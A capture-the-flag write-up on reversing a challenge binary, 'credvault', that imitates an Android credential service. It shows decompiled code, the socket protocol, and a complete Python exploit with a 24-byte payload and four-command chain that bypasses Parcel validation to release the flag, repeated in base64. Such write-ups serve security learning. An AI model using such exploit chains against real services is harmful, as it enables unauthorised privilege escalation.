
<img width="1115" height="584" alt="image" src="https://github.com/user-attachments/assets/b8184a22-b89b-4ec8-90c1-40357ac09576" />

<img width="757" height="69" alt="image" src="https://github.com/user-attachments/assets/2df3a26b-df04-4587-bf15-2f2eb2de0e8a" />

# Challenge Description


PktTrack's mobile team extracted credvault from a rooted Android device. The binary implements com.android.credentialservice.CredVaultService, which issues elevated credential tokens to authorized clients.
The service was recently migrated to a new Parcel format. The mobile team signed off on the migration. Nobody checked the forwarding path.

Objective: Interact with a service extracted from an Android device and exploit its validation logic (Parcel data parsing) to extract the flag


## Initial Analysis

The first step was opening the extracted binary in Ghidra to understand the execution flow.
Our attention is immediately drawn to the main function of the program (FUN_00101260, which we rename to -> main). Analyzing the decompiled code, we notice that the program initially uses a test flag, preloaded into memory.

The program tries to read the real flag from a file or from the CREDVAULT_FLAG environment variable. If successful, it overwrites the memory buffer. If not, it keeps the local dummy flag in memory: 
```python
#Dummy flag
CTF{local_test_only_not_a_real_flag}
```
This behavior is visible in the following decompiled code:

```c++
// Try to read the file / flag from disk
  sVar3 = read(3,s_CTF{local_test_only_not_a_real_f_00104020,0x7f);
  if (sVar3 < 1) {
    close(3);
    // If it fails, check the CREDVAULT_FLAG environment variable
    __src = getenv("CREDVAULT_FLAG");
    if (__src != (char *)0x0) {
      // Overwrite the dummy flag with the flag extracted from the environment
      strncpy(s_CTF{local_test_only_not_a_real_f_00104020,__src,0x7f);
      DAT_0010409f = 0;
    }
  }
  else {
    lVar4 = sVar3 + -1;
    if ((&DAT_0010401f)[sVar3] != '\n') {
      lVar4 = sVar3;
    }
    s_CTF{local_test_only_not_a_real_f_00104020[lVar4] = '\0';
    close(3);
  }
  uVar5 = 0x539; // Default port 1337
  unsetenv("CREDVAULT_FLAG");
```


Immediately after initializing the environment, we notice standard network calls from the libc. The program creates a TCP server that binds to a specific port (in this case 0x539, which is 1337 in decimal) and enters a listening state:

```c++
__fd = socket(2,1,0); // Create TCP socket
  if (__fd < 0) {
    perror("socket");
  }
  else {
    local_7c = 1;
    setsockopt(__fd,1,2,&local_7c,4);
    
    // Setup sockaddr structure
    local_78.sa_data[10] = '\0';
    local_78.sa_data[0xb] = '\0';
    // [...]
    local_78.sa_data[9] = '\0';
    
    local_78.sa_family = 2; 
    local_78.sa_data._0_2_ = uVar5 << 8 | uVar5 >> 8; // Port configuration
    
    iVar1 = bind(__fd,&local_78,0x10);
    if (iVar1 < 0) {
      perror("bind");
    }
    else {
      iVar1 = listen(__fd,1);
      if (iVar1 < 0) {
        perror("listen");
      }
      else {
        // Wait for client connection
        iVar1 = accept(__fd,(sockaddr *)0x0,(socklen_t *)0x0);
        if (-1 < iVar1) {
          local_60 = (undefined1 [16])0x0;
          local_50 = (undefined1 [16])0x0;
          local_40 = 0;
          local_68[1] = 0xca1dcafe;
          local_68[0] = iVar1;
          
          // Pass the client file descriptor to the handler function
          FUN_00101670(local_68);
          
          close(iVar1);
          close(__fd);
          uVar2 = 0;
          goto LAB_001013cf;
        }
        perror("accept");
      }
    }
  }
```
After the `accept()` call, the program receives the connection and passes the file descriptor to the `FUN_00101670(local_68)` function. This acts as a "handler" for the client and is where the actual communication and the Parcel vulnerability reside.

# Analysis and Vulnerability

Exploring the client processing function `(FUN_00101670)`, we realize the interaction is done through a custom protocol, wrapped in an 8-byte header (Little Endian format):

4 bytes: Command ID (cmd)
|--|
4 bytes: Length of the subsequent data (len(data))



The vulnerability mentioned in the description ("Nobody checked the forwarding path") appears during the processing of the new Parcel data structure. Due to a flawed implementation of the validations, we can force the service to grant us an authorized client context with elevated permissions.

# Exploitation 

Once elevated access is obtained, we must guide the service's state machine through a series of specific steps to release the flag. The execution chain requires sending 4 sequential commands over the socket:

Exploitation Steps
|-----|
0xca000002 + payload (24 bytes): Initializes the context and exploits the missing validation on the forwarding path.
|-----|
0xca000003: Sets the first internal state flag (state A).
|-----|
0xca000004: Sets the second internal state flag (state B).
|-----|
0xca000005: Issues the final request to retrieve the real flag, which the server will write back to the socket.
|----|


#### I implemented all these steps in a Python script. The script connects to the service, builds the Little Endian header for each command, and interacts with the server until the desired response is received.

```python
#!/usr/bin/env python3
import sys
import socket
import struct

def send_cmd(sock, cmd, data=b''):
    """Packs and sends the command to the server (8-byte header + payload)"""
    sock.send(struct.pack('<II', cmd, len(data)))
    if data:
        sock.send(data)

def recv_until(sock, timeout=1):
    """Reads the response from the socket"""
    sock.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def main():
    host = "127.0.0.1"
    port = 9999

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    # Payload for command 0xca000002 (24 bytes) used to bypass validation
    payload = bytes.fromhex(
        '01 00 11 ca 42 00 11 ca 01 00 00 00 00 00 00 00 00 00 00 00 42 00 00 00'
    )

    # Exploitation chain
    send_cmd(sock, 0xca000002, payload)   # Set elevated context
    send_cmd(sock, 0xca000003)            # Set internal state A
    send_cmd(sock, 0xca000004)            # Set internal state B
    send_cmd(sock, 0xca000005)            # Request flag release

    # Retrieve and print the flag
    flag = recv_until(sock).decode(errors='ignore').strip()
    print(f" Flag: {flag}")
    sock.close()

if __name__ == '__main__':
    main()
```


### First we make it in base64 and after that we sand it to the server

```python
base64 -w0 exploit.py
```

```
IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgc3lzCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN0cnVjdAoKZGVmIHNlbmRfY21kKHNvY2ssIGNtZCwgZGF0YT1iJycpOgogICAgIiIiUGFja3MgYW5kIHNlbmRzIHRoZSBjb21tYW5kIHRvIHRoZSBzZXJ2ZXIgKDgtYnl0ZSBoZWFkZXIgKyBwYXlsb2FkKSIiIgogICAgc29jay5zZW5kKHN0cnVjdC5wYWNrKCc8SUknLCBjbWQsIGxlbihkYXRhKSkpCiAgICBpZiBkYXRhOgogICAgICAgIHNvY2suc2VuZChkYXRhKQoKZGVmIHJlY3ZfdW50aWwoc29jaywgdGltZW91dD0xKToKICAgICIiIlJlYWRzIHRoZSByZXNwb25zZSBmcm9tIHRoZSBzb2NrZXQiIiIKICAgIHNvY2suc2V0dGltZW91dCh0aW1lb3V0KQogICAgZGF0YSA9IGInJwogICAgdHJ5OgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGNodW5rID0gc29jay5yZWN2KDQwOTYpCiAgICAgICAgICAgIGlmIG5vdCBjaHVuazoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGRhdGEgKz0gY2h1bmsKICAgIGV4Y2VwdCBzb2NrZXQudGltZW91dDoKICAgICAgICBwYXNzCiAgICByZXR1cm4gZGF0YQoKZGVmIG1haW4oKToKICAgIGhvc3QgPSAiMTI3LjAuMC4xIgogICAgcG9ydCA9IDk5OTkKCiAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgc29jay5jb25uZWN0KChob3N0LCBwb3J0KSkKCiAgICAjIFBheWxvYWQgZm9yIGNvbW1hbmQgMHhjYTAwMDAwMiAoMjQgYnl0ZXMpIHVzZWQgdG8gYnlwYXNzIHZhbGlkYXRpb24KICAgIHBheWxvYWQgPSBieXRlcy5mcm9taGV4KAogICAgICAgICcwMSAwMCAxMSBjYSA0MiAwMCAxMSBjYSAwMSAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCAwMCA0MiAwMCAwMCAwMCcKICAgICkKCiAgICAjIEV4cGxvaXRhdGlvbiBjaGFpbgogICAgc2VuZF9jbWQoc29jaywgMHhjYTAwMDAwMiwgcGF5bG9hZCkgICAjIFNldCBlbGV2YXRlZCBjb250ZXh0CiAgICBzZW5kX2NtZChzb2NrLCAweGNhMDAwMDAzKSAgICAgICAgICAgICMgU2V0IGludGVybmFsIHN0YXRlIEEKICAgIHNlbmRfY21kKHNvY2ssIDB4Y2EwMDAwMDQpICAgICAgICAgICAgIyBTZXQgaW50ZXJuYWwgc3RhdGUgQgogICAgc2VuZF9jbWQoc29jaywgMHhjYTAwMDAwNSkgICAgICAgICAgICAjIFJlcXVlc3QgZmxhZyByZWxlYXNlCgogICAgIyBSZXRyaWV2ZSBhbmQgcHJpbnQgdGhlIGZsYWcKICAgIGZsYWcgPSByZWN2X3VudGlsKHNvY2spLmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkKICAgIHByaW50KGYiIEZsYWc6IHtmbGFnfSIpCiAgICBzb2NrLmNsb3NlKCkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBtYWluKCkK

END
```

<img width="1503" height="689" alt="image" src="https://github.com/user-attachments/assets/33bc7d89-d0a6-461b-b73f-b8f24ac6150c" />


<img width="1508" height="580" alt="image" src="https://github.com/user-attachments/assets/fe0331be-6368-4f40-a904-66c7af6600c2" />


